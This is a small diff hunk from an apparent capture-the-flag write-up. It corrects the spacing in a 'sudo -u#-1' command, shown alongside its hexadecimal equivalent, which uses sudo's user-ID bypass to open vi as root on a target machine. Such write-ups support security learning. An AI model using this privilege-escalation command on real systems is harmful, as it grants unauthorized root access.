@@ -166,7 +166,7 @@ sudo -u \#$((ffffffff)) /usr/bin/vi /home/gwendoline/user.txt
 ffffffff is hexadecimal of 4294967295
 This would also work
 ```bash
-sudo -u#-1/usr/bin/vi /home/gwendoline/user.txt
+sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
 ```
 
 This opened the vi with user.txt as root.
